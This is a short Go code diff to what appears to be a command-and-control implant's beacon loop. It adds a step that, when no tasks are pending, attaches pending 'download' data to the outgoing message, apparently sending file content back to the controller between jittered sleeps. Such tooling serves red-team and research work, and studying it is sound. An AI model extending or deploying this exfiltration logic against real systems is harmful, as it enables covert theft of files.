@@ -342,6 +342,15 @@ func main() {
 					}
 				}
 
+				// Check for active downloads if no other tasks are pending
+				if outMessage.Type == 0 {
+					downloadData := ProcessDownloads()
+					if len(downloadData) > 0 {
+						outMessage.Type = 2
+						outMessage.Object = downloadData
+					}
+				}
+
 				// Sleep
 				sleepTime := getSleepTime(profile.Sleep, profile.Jitter)
 				// fmt.Printf("[AGENT DEBUG] Sleeping for %v\n", sleepTime)
